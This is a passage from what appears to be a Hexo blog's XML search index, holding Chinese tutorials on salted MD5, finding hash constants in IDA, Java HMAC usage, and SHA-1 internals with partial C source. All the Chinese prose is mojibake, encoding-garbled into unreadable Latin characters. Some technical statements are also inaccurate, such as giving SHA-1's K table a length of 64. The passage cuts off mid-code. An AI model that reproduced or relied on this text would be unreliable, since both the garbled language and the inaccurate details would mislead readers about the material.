0x1b710b35131c471bULL,</span><br><span class="line">        0x28db77f523047d84ULL, 0x32caab7b40c72493ULL, 0x3c9ebe0a15c9bebcULL, 0x431d67c49c100d4cULL,</span><br><span class="line">        0x4cc5d4becb3e42b6ULL, 0x597f299cfc657e2aULL, 0x5fcb6fab3ad6faecULL, 0x6c44198c4a475817ULL</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="MD5-salt-åŠ ç›"><a href="#MD5-salt-åŠ ç›" class="headerlink" title="MD5-salt(åŠ ç›)"></a>MD5-salt(åŠ ç›)</h2><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åœ¨MD5çš„å€¼åé¢åŠ ä¸Šäº†ä¸€ä¸ªå¸¸é‡ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼šæ˜æ–‡å­—ç¬¦ä¸²ä¸º â€œ123456â€ï¼Œç›ä¸º â€œhelloâ€ã€‚</p><ul><li>æ­£å¸¸md5(123456) &#x3D; e10adc3949ba59abbe56e057f20f883e</li><li>åŠ ç›md5(123456) &#x3D; 04522abf42bb8ad979fe66948402bc0d</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171437789.png" alt="image.png"> </p><p>æ­£å¸¸md5(123456hello) &#x3D; â€œ04522abf42bb8ad979fe66948402bc0dâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171437356.png" alt="image.png"> </p><p>ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼ŒåŠ ç›md5(123456,hello) &#x3D; md5(123456hello)ã€‚<strong>æ‰€è°“çš„åŠ ç›ï¼Œå°±æ˜¯åœ¨å­—ç¬¦ä¸²æ‹¼æ¥åå†æ±‚å…¶md5</strong>ã€‚</p><h1 id="äºŒ-å“ˆå¸Œç®—æ³•ç‰¹å¾å¯»æ‰¾-æ¯”å¯¹"><a href="#äºŒ-å“ˆå¸Œç®—æ³•ç‰¹å¾å¯»æ‰¾-æ¯”å¯¹" class="headerlink" title="äºŒ å“ˆå¸Œç®—æ³•ç‰¹å¾å¯»æ‰¾&amp;æ¯”å¯¹"></a>äºŒ å“ˆå¸Œç®—æ³•ç‰¹å¾å¯»æ‰¾&amp;æ¯”å¯¹</h1><p>æ­£å¸¸çš„é’ˆå¯¹è¿™äº›ç®—æ³•çš„ç‰¹å¾ï¼Œå°±æ˜¯æ‰¾ä»–çš„åˆå§‹åŒ–é“¾æ¥å˜é‡å’ŒKå€¼ã€‚è¿™å—ä»¥sha512ä¸ºä¾‹</p><p>1ã€é¦–å…ˆçœ‹å®ƒçš„é“¾æ¥å˜é‡ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171443920.png" alt="image.png"> </p><p>å› ä¸º32ä½IDAï¼Œåªèƒ½è¡¨ç¤º8ä¸ªåå…­è¿›åˆ¶ä½ã€‚æ‰€ä»¥ï¼Œè¿™å—æœ‰16ä¸ªé“¾æ¥å˜é‡ï¼ˆ4-19ï¼‰</p><p>2ã€å†çœ‹ä¸€ä¸‹SHA512çš„Kè¡¨</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171443970.png" alt="image.png"> </p><h1 id="ä¸‰-HMACç®—æ³•ä»‹ç»"><a href="#ä¸‰-HMACç®—æ³•ä»‹ç»" class="headerlink" title="ä¸‰ HMACç®—æ³•ä»‹ç»"></a>ä¸‰ HMACç®—æ³•ä»‹ç»</h1><p>åœ¨å‰é¢è®²åˆ°å“ˆå¸Œç®—æ³•æ—¶ï¼Œæˆ‘ä»¬è¯´ï¼Œå­˜å‚¨ç”¨æˆ·çš„å“ˆå¸Œå£ä»¤æ—¶ï¼Œè¦åŠ ç›å­˜å‚¨ï¼Œç›®çš„å°±åœ¨äºæŠµå¾¡å½©è™¹è¡¨æ”»å‡»ã€‚</p><p>æˆ‘ä»¬å›é¡¾ä¸€ä¸‹å“ˆå¸Œç®—æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digest = hash(input)</span><br></pre></td></tr></table></figure><p>æ­£æ˜¯å› ä¸ºç›¸åŒçš„è¾“å…¥ä¼šäº§ç”Ÿç›¸åŒçš„è¾“å‡ºï¼Œæˆ‘ä»¬åŠ ç›çš„ç›®çš„å°±åœ¨äºï¼Œä½¿å¾—è¾“å…¥æœ‰æ‰€å˜åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digest = hash(salt + input)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªsaltå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªé¢å¤–çš„â€œè®¤è¯ç â€ï¼ŒåŒæ ·çš„è¾“å…¥ï¼Œä¸åŒçš„è®¤è¯ç ï¼Œä¼šäº§ç”Ÿä¸åŒçš„è¾“å‡ºã€‚å› æ­¤ï¼Œè¦éªŒè¯è¾“å‡ºçš„å“ˆå¸Œï¼Œå¿…é¡»åŒæ—¶æä¾›â€œè®¤è¯ç â€ã€‚</p><p><strong>Hmacç®—æ³•</strong>å°±æ˜¯ä¸€ç§åŸºäºå¯†é’¥çš„æ¶ˆæ¯è®¤è¯ç ç®—æ³•ï¼Œå®ƒçš„å…¨ç§°æ˜¯Hash-based Message Authentication Codeï¼Œæ˜¯ä¸€ç§æ›´å®‰å…¨çš„æ¶ˆæ¯æ‘˜è¦ç®—æ³•ã€‚</p><p>Hmacç®—æ³•æ€»æ˜¯å’ŒæŸç§å“ˆå¸Œç®—æ³•é…åˆèµ·æ¥ç”¨çš„ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬ä½¿ç”¨MD5ç®—æ³•ï¼Œå¯¹åº”çš„å°±æ˜¯HmacMD5ç®—æ³•ï¼Œå®ƒç›¸å½“äºâ€œåŠ ç›â€çš„MD5ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HmacMD5 â‰ˆ md5(secure_random_key, input)</span><br></pre></td></tr></table></figure><p>æ­¤ï¼ŒHmacMD5å¯ä»¥çœ‹ä½œå¸¦æœ‰ä¸€ä¸ªå®‰å…¨çš„keyçš„MD5ã€‚ä½¿ç”¨HmacMD5è€Œä¸æ˜¯ç”¨MD5åŠ saltï¼Œæœ‰å¦‚ä¸‹å¥½å¤„ï¼š</p><ul><li>HmacMD5ä½¿ç”¨çš„keyé•¿åº¦æ˜¯64å­—èŠ‚ï¼Œæ›´å®‰å…¨ï¼›</li><li>Hmacæ˜¯æ ‡å‡†ç®—æ³•ï¼ŒåŒæ ·é€‚ç”¨äºSHA-1ç­‰å…¶ä»–å“ˆå¸Œç®—æ³•ï¼›</li><li>Hmacè¾“å‡ºå’ŒåŸæœ‰çš„å“ˆå¸Œç®—æ³•é•¿åº¦ä¸€è‡´ã€‚</li></ul><p>å¯è§ï¼ŒHmacæœ¬è´¨ä¸Šå°±æ˜¯æŠŠkeyæ··å…¥æ‘˜è¦çš„ç®—æ³•ã€‚éªŒè¯æ­¤å“ˆå¸Œæ—¶ï¼Œé™¤äº†åŸå§‹çš„è¾“å…¥æ•°æ®ï¼Œè¿˜è¦æä¾›keyã€‚</p><p>ä¸ºäº†ä¿è¯å®‰å…¨ï¼Œæˆ‘ä»¬ä¸ä¼šè‡ªå·±æŒ‡å®škeyï¼Œè€Œæ˜¯é€šè¿‡Javaæ ‡å‡†åº“çš„KeyGeneratorç”Ÿæˆä¸€ä¸ªå®‰å…¨çš„éšæœºçš„keyã€‚ä¸‹é¢æ˜¯ä½¿ç”¨HmacMD5çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HexFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyGenerator.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">key</span> <span class="operator">=</span> keyGen.generateKey();</span><br><span class="line">        <span class="comment">// æ‰“å°éšæœºç”Ÿæˆçš„key:</span></span><br><span class="line">        <span class="type">byte</span>[] skey = key.getEncoded();</span><br><span class="line">        System.out.println(HexFormat.of().formatHex(skey));</span><br><span class="line">        <span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        mac.init(key);</span><br><span class="line">        mac.update(<span class="string">&quot;HelloWorld&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] result = mac.doFinal();</span><br><span class="line">        System.out.println(HexFormat.of().formatHex(result));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’ŒMD5ç›¸æ¯”ï¼Œä½¿ç”¨HmacMD5çš„æ­¥éª¤æ˜¯ï¼š</p><ol><li>é€šè¿‡åç§°HmacMD5è·å–KeyGeneratorå®ä¾‹ï¼›</li><li>é€šè¿‡KeyGeneratoråˆ›å»ºä¸€ä¸ªSecretKeyå®ä¾‹ï¼›</li><li>é€šè¿‡åç§°HmacMD5è·å–Macå®ä¾‹ï¼›</li><li>ç”¨SecretKeyåˆå§‹åŒ–Macå®ä¾‹ï¼›</li><li>å¯¹Macå®ä¾‹åå¤è°ƒç”¨update(byte[])è¾“å…¥æ•°æ®ï¼›</li><li>è°ƒç”¨Macå®ä¾‹çš„doFinal()è·å–æœ€ç»ˆçš„å“ˆå¸Œå€¼ã€‚</li></ol><p>æˆ‘ä»¬å¯ä»¥ç”¨Hmacç®—æ³•å–ä»£åŸæœ‰çš„è‡ªå®šä¹‰çš„åŠ ç›ç®—æ³•ï¼Œå› æ­¤ï¼Œå­˜å‚¨ç”¨æˆ·åå’Œå£ä»¤çš„æ•°æ®åº“ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171548319.png" alt="img"> </p><p>æœ‰äº†Hmacè®¡ç®—çš„å“ˆå¸Œå’ŒSecretKeyï¼Œæˆ‘ä»¬æƒ³è¦éªŒè¯æ€ä¹ˆåŠï¼Ÿè¿™æ—¶ï¼ŒSecretKeyä¸èƒ½ä»KeyGeneratorç”Ÿæˆï¼Œè€Œæ˜¯ä»ä¸€ä¸ªbyte[]æ•°ç»„æ¢å¤ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.*;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HexFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] hkey = HexFormat.of().parseHex(</span><br><span class="line">                <span class="string">&quot;b648ee779d658c420420d86291ec70f5&quot;</span> + </span><br><span class="line">                <span class="string">&quot;cf97521c740330972697a8fad0b55f5c&quot;</span> + </span><br><span class="line">                <span class="string">&quot;5a7924e4afa99d8c5883e07d7c3f9ed0&quot;</span> + </span><br><span class="line">                <span class="string">&quot;76aa544d25ed2f5ceea59dcc122babc8&quot;</span>);</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(hkey, <span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        <span class="type">Mac</span> <span class="variable">mac</span> <span class="operator">=</span> Mac.getInstance(<span class="string">&quot;HmacMD5&quot;</span>);</span><br><span class="line">        mac.init(key);</span><br><span class="line">        mac.update(<span class="string">&quot;HelloWorld&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] result = mac.doFinal();</span><br><span class="line">        System.out.println(HexFormat.of().formatHex(result)); <span class="comment">// 4af40be7864efaae1473a4c601b650ae</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¢å¤SecretKeyçš„è¯­å¥å°±æ˜¯new SecretKeySpec(hkey, â€œHmacMD5â€)ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> å“ˆå¸Œç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹SHA1</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BSHA1/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BSHA1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-sha1ç®—æ³•åŸç†"><a href="#ä¸€-sha1ç®—æ³•åŸç†" class="headerlink" title="ä¸€ sha1ç®—æ³•åŸç†"></a>ä¸€ sha1ç®—æ³•åŸç†</h1><p>SHA1ç®—æ³•æ˜¯Hashç®—æ³•çš„ä¸€ç§ã€‚SHA1ç®—æ³•çš„æœ€å¤§è¾“å…¥é•¿åº¦å°äº2^64æ¯”ç‰¹çš„æ¶ˆæ¯ï¼Œè¾“å…¥æ¶ˆæ¯ï¼ˆ<strong>æ˜æ–‡</strong>ï¼‰ä»¥512æ¯”ç‰¹çš„åˆ†ç»„ä¸ºå•ä½å¤„ç†ï¼Œè¾“å‡º160æ¯”ç‰¹çš„æ¶ˆæ¯æ‘˜è¦ï¼ˆ<strong>å¯†æ–‡</strong>ï¼‰</p><p>æ•´ä¸ªç®—æ³•çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªåŒ…å«4è½®å¾ªç¯çš„æ¨¡å—ï¼Œæ¯è½®å¾ªç¯ç”±20ä¸ªæ­¥éª¤ç»„æˆã€‚</p><p>å…·ä½“å®ç°æ­¥éª¤å¦‚ä¸‹ï¼š</p><h2 id="1-é™„åŠ å¡«å……ä½"><a href="#1-é™„åŠ å¡«å……ä½" class="headerlink" title="1 é™„åŠ å¡«å……ä½"></a>1 é™„åŠ å¡«å……ä½</h2><p>æ¶ˆæ¯å¿…é¡»è¿›è¡Œå¡«å……ï¼Œä»¥ä½¿å…¶é•¿åº¦åœ¨å¯¹512å–æ¨¡ä»¥åçš„ä½™æ•°æ˜¯448ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œï¼ˆå¡«å……åçš„æ¶ˆæ¯é•¿åº¦ï¼‰%512 &#x3D; 448ã€‚å³ä½¿é•¿åº¦å·²ç»æ»¡è¶³å¯¹512å–æ¨¡åä½™æ•°æ˜¯448ï¼Œå¡«å……ä¹Ÿå¿…é¡»è¦è¿›è¡Œã€‚<strong>å¡«å……çš„è§„åˆ™æ˜¯å¡«å……ä¸€ä¸ªâ€œ1â€å’Œè‹¥å¹²ä¸ªâ€œ0â€ä½¿å…¶é•¿åº¦æ¨¡512å’Œ448åŒä½™ã€‚ç„¶åé™„åŠ 64æ¯”ç‰¹çš„æ— ç¬¦å·æ•´æ•°ï¼Œå…¶å€¼ä¸ºåŸå§‹æ¶ˆæ¯çš„é•¿åº¦ï¼ˆè¿™å—å’ŒMD5æ˜¯ä¸€æ ·çš„ï¼‰</strong></p><h2 id="2-é™„åŠ é•¿åº¦ä¿¡æ¯"><a href="#2-é™„åŠ é•¿åº¦ä¿¡æ¯" class="headerlink" title="2 é™„åŠ é•¿åº¦ä¿¡æ¯"></a>2 é™„åŠ é•¿åº¦ä¿¡æ¯</h2><p>åé¢çš„64æ¯”ç‰¹ä½ï¼Œç”¨æ¥å¡«å……é•¿åº¦ä¿¡æ¯ï¼Œé•¿åº¦å•ä½ä¸ºæ¯”ç‰¹ã€‚<strong>ï¼ˆè¿™å—å’ŒMD5ä¸€æ ·ï¼‰</strong></p><h2 id="3-ä¿¡æ¯åˆ†ç»„å¤„ç†"><a href="#3-ä¿¡æ¯åˆ†ç»„å¤„ç†" class="headerlink" title="3 ä¿¡æ¯åˆ†ç»„å¤„ç†"></a>3 ä¿¡æ¯åˆ†ç»„å¤„ç†</h2><p>ç»è¿‡æ·»åŠ ä½æ•°å¤„ç†çš„æ˜æ–‡ï¼Œå…¶é•¿åº¦æ­£å¥½ä¸º512ä½çš„æ•´æ•°å€ï¼Œç„¶åæŒ‰512ä½çš„é•¿åº¦è¿›è¡Œåˆ†ç»„ï¼Œå¯ä»¥å¾—åˆ°ä¸€å®šæ•°é‡çš„æ˜æ–‡åˆ†ç»„ï¼Œè¿™å—å¯ä»¥ç”¨Y0,Y1,Y2,â€¦,YN-1æ¥è¡¨ç¤ºï¼Œå¯¹äºæ¯ä¸€ä¸ªåˆ†ç»„ï¼Œè¿›è¡Œå¤„ç†ã€‚<strong>ï¼ˆè¿™å—å’ŒMD5ä¸€æ ·ï¼‰</strong></p><p>è€Œå¯¹äºæ¯ä¸ª512ä½çš„æ˜æ–‡åˆ†ç»„ï¼ŒSHA1å°†å…¶å†åˆ†æˆ16ä¸ªæ›´å°çš„æ˜æ–‡åˆ†ç»„ï¼Œç§°ä¸ºå­æ˜æ–‡åˆ†ç»„ï¼Œæ¯ä¸ªå­æ˜æ–‡åˆ†ç»„ä¸º32ä½ï¼Œè¿™å—ä½¿ç”¨ M<a href="t=0,1,......15">t</a>æ¥è¡¨ç¤ºç€16ä¸ªå­æ˜æ–‡åˆ†ç»„ã€‚ç„¶åéœ€è¦å°†è¿™16ä¸ªå­æ˜æ–‡åˆ†ç»„æ‰©å……åˆ°80ä¸ªå­æ˜æ–‡åˆ†ç»„ï¼Œåˆ†åˆ«å°†å…¶è®°ä¸º W<a href="t=0,t=1,......,79">t</a>ï¼Œæ‰©å……çš„å…·ä½“æ–¹æ³•ä¸ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171343817.png" alt="image.png"> </p><h2 id="4-åˆå§‹åŒ–é“¾æ¥å‘é‡"><a href="#4-åˆå§‹åŒ–é“¾æ¥å‘é‡" class="headerlink" title="4 åˆå§‹åŒ–é“¾æ¥å‘é‡"></a>4 åˆå§‹åŒ–é“¾æ¥å‘é‡</h2><p>å’ŒMD5æœ‰äº›ç±»ä¼¼ï¼Œå°†5ä¸ª32æ¯”ç‰¹çš„å›ºå®šæ•°èµ‹å€¼ç»™5ä¸ª32æ¯”ç‰¹çš„å¯„å­˜å™¨ï¼ˆå’Œæ±‡ç¼–é‡Œé¢çš„å¯„å­˜å™¨ä¸åŒï¼Œå¯ä»¥ç†è§£ä¸ºå˜é‡ï¼‰Aã€Bã€Cã€Dã€Eä½œä¸ºç¬¬ä¸€æ¬¡è¿­ä»£çš„é“¾æ¥å˜é‡è¾“å…¥ï¼š</p><ul><li><strong>A &#x3D; 0x67452301</strong></li><li><strong>B &#x3D; 0xEFCDAB89</strong></li><li><strong>C &#x3D; 0x98BADCFE</strong></li><li><strong>D &#x3D; 0x10325476</strong></li><li><strong>E &#x3D; 0xC3D2E1F0</strong></li></ul><h2 id="5-è¿ç®—"><a href="#5-è¿ç®—" class="headerlink" title="5 è¿ç®—"></a>5 è¿ç®—</h2><p>ç»è¿‡å‰é¢çš„å‡†å¤‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—ä¿¡æ¯æ‘˜è¦ã€‚SHA1æœ‰4è½®è¿ç®—ï¼Œæ¯ä¸€è½®åŒ…æ‹¬20ä¸ªæ­¥éª¤ï¼Œä¸€å…±80æ­¥ã€‚æœ€ç»ˆ<strong>äº§ç”Ÿ160ä½çš„ä¿¡æ¯æ‘˜è¦</strong>ï¼Œè¿™160ä½çš„ä¿¡æ¯æ‘˜è¦ç›´æ¥å­˜æ”¾åœ¨5ä¸ª32ä½çš„é“¾æ¥å˜é‡ä¸­ã€‚</p><p>åœ¨SHA1çš„4è½®è¿ç®—ä¸­ï¼Œè™½ç„¶è¿›è¡Œçš„å…·ä½“æ“ä½œå‡½æ•°ä¸åŒï¼Œä½†æ˜¯é€»è¾‘è¿‡ç¨‹æ˜¯ä¸€è‡´çš„ã€‚é¦–å…ˆï¼Œå®šä¹‰5ä¸ªå˜é‡ï¼Œå‡è®¾ä¸ºH0ã€H1ã€H2ã€H3ã€H4ï¼Œå¯¹å…¶åˆ†åˆ«è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ul><li>å°†Aå·¦ç§»5ä½ä¸å‡½æ•°çš„ç»“æœæ±‚å’Œï¼Œå†ä¸å…¶å¯¹åº”çš„å­æ˜æ–‡åˆ†ç»„ã€Eä»¥åŠè®¡ç®—å¸¸æ•°æ±‚å’Œåçš„ç»“æœèµ‹å€¼ç»™H0</li><li>å°†Açš„å€¼èµ‹äºˆH1</li><li>å°†Bå·¦ç§»30ä½ï¼Œå¹¶èµ‹äºˆH2</li><li>å°†Cçš„å€¼èµ‹äºˆH3</li><li>å°†Dçš„å€¼èµ‹äºˆH4</li><li>æœ€åå°†H0ã€H1ã€H2ã€H3ã€H4å€¼åˆ†åˆ«èµ‹äºˆAã€Bã€Cã€Dã€E</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171348817.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171348711.png" alt="image.png"> </p><p><strong>Kå€¼çš„è·å–ï¼ˆMD5ä¸­ä¹Ÿæœ‰Kè¡¨ï¼Œåªä¸è¿‡ len(md5_k)&#x3D;64ï¼Œè€Œ  len(sha1_k)&#x3D;64ï¼‰</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171348427.png" alt="image.png"> </p><p>ä¸‹é¢æ˜¯80è½®å¾ªç¯çš„ç®€æ˜“ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ç¬¬ä¸€è½®R1[a,b,c,d,e,j]è¡¨ç¤ºe = e + F1(b,c,d)+rol(a,5)+W[j]+K1;b=rol(b,30)</span><br><span class="line">R1(a, b, c, d, e, 0),R1(e, a, b, c, d, 1),R1(d, e, a, b, c, 2),R1(c, d, e, a, b, 3)</span><br><span class="line">R1(b, c, d, e, a, 4),R1(a, b, c, d, e, 5),R1(e, a, b, c, d, 6),R1(d, e, a, b, c, 7)</span><br><span class="line">R1(c, d, e, a, b, 8),R1(b, c, d, e, a, 9),R1(a, b, c, d, e, 10),R1(e, a, b, c, d, 11)</span><br><span class="line">R1(d, e, a, b, c, 12),R1(c, d, e, a, b, 13),R1(b, c, d, e, a, 14),R1(a, b, c, d, e, 15)</span><br><span class="line">R1(e, a, b, c, d, 16),R1(d, e, a, b, c, 17),R1(c, d, e, a, b, 18),R1(b, c, d, e, a, 19)</span><br><span class="line"></span><br><span class="line">//ç¬¬äºŒè½®R2[a,b,c,d,e,j]è¡¨ç¤ºe = e + F2(b,c,d)+rol(a,5)+W[j]+K2;b=rol(b,30)</span><br><span class="line">R2(a, b, c, d, e, 20);R2(e, a, b, c, d, 21);R2(d, e, a, b, c, 22);R2(c, d, e, a, b, 23);</span><br><span class="line">R2(b, c, d, e, a, 24);R2(a, b, c, d, e, 25);R2(e, a, b, c, d, 26);R2(d, e, a, b, c, 27);</span><br><span class="line">R2(c, d, e, a, b, 28);R2(b, c, d, e, a, 29);R2(a, b, c, d, e, 30);R2(e, a, b, c, d, 31);</span><br><span class="line">R2(d, e, a, b, c, 32);R2(c, d, e, a, b, 33);R2(b, c, d, e, a, 34);R2(a, b, c, d, e, 35);</span><br><span class="line">R2(e, a, b, c, d, 36);R2(d, e, a, b, c, 37);R2(c, d, e, a, b, 38);R2(b, c, d, e, a, 39);</span><br><span class="line"></span><br><span class="line">//ç¬¬ä¸‰è½®R3[a,b,c,d,e,j]è¡¨ç¤ºe = e + F3(b,c,d)+rol(a,5)+W[j]+K3;b=rol(b,30)</span><br><span class="line">R3(a, b, c, d, e, 40);R3(e, a, b, c, d, 41);R3(d, e, a, b, c, 42);R3(c, d, e, a, b, 43);</span><br><span class="line">R3(b, c, d, e, a, 44);R3(a, b, c, d, e, 45);R3(e, a, b, c, d, 46);R3(d, e, a, b, c, 47);</span><br><span class="line">R3(c, d, e, a, b, 48);R3(b, c, d, e, a, 49);R3(a, b, c, d, e, 50);R3(e, a, b, c, d, 51);</span><br><span class="line">R3(d, e, a, b, c, 52);R3(c, d, e, a, b, 53);R3(b, c, d, e, a, 54);R3(a, b, c, d, e, 55);</span><br><span class="line">R3(e, a, b, c, d, 56);R3(d, e, a, b, c, 57);R3(c, d, e, a, b, 58);R3(b, c, d, e, a, 59);</span><br><span class="line"></span><br><span class="line">//ç¬¬å››è½®R4[a,b,c,d,e,j]è¡¨ç¤ºe = e + F4(b,c,d)+rol(a,5)+W[j]+K4;b=rol(b,30)</span><br><span class="line">R4(a, b, c, d, e, 60);R4(e, a, b, c, d, 61);R4(d, e, a, b, c, 62);R4(c, d, e, a, b, 63);</span><br><span class="line">R4(b, c, d, e, a, 64);R4(a, b, c, d, e, 65);R4(e, a, b, c, d, 66);R4(d, e, a, b, c, 67);</span><br><span class="line">R4(c, d, e, a, b, 68);R4(b, c, d, e, a, 69);R4(a, b, c, d, e, 70);R4(e, a, b, c, d, 71);</span><br><span class="line">R4(d, e, a, b, c, 72);R4(c, d, e, a, b, 73);R4(b, c, d, e, a, 74);R4(a, b, c, d, e, 75);</span><br><span class="line">R4(e, a, b, c, d, 76);R4(d, e, a, b, c, 77);R4(c, d, e, a, b, 78);R4(b, c, d, e, a, 79);</span><br></pre></td></tr></table></figure><h2 id="6-è¾“å‡º"><a href="#6-è¾“å‡º" class="headerlink" title="6 è¾“å‡º"></a>6 è¾“å‡º</h2><p>è¿ç®—ç»“æŸï¼Œå°†ABCDEåˆå¹¶è¾“å‡º</p><h1 id="äºŒ-æºç å®ç°"><a href="#äºŒ-æºç å®ç°" class="headerlink" title="äºŒ æºç å®ç°"></a>äºŒ æºç å®ç°</h1><p>sha1.h</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHA1_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHA1_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHA1HANDSOFF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LITTLE_ENDIAN</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> state[<span class="number">5</span>];<span class="comment">/* 160(5Ã—32)æ¯”ç‰¹çš„æ¶ˆæ¯æ‘˜è¦ï¼ˆå³SHA-1ç®—æ³•è¦å¾—å‡ºçš„ï¼‰ */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> count[<span class="number">2</span>];<span class="comment">/* å‚¨å­˜æ¶ˆæ¯çš„é•¿åº¦ï¼ˆå•ä½ï¼šæ¯”ç‰¹ï¼‰ */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>];<span class="comment">/* 512(64Ã—8)æ¯”ç‰¹ï¼ˆä½ï¼‰çš„æ¶ˆæ¯å—ï¼ˆç”±åŸå§‹æ¶ˆæ¯ç»å¤„ç†å¾—å‡ºï¼‰ */</span></span><br><span class="line">&#125; SHA1_CTX;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Init</span><span class="params">(SHA1_CTX *context)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Update</span><span class="params">(SHA1_CTX *context, <span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Final</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">20</span>], SHA1_CTX *context)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>sha1.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sha1.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c[<span class="number">64</span>];</span><br><span 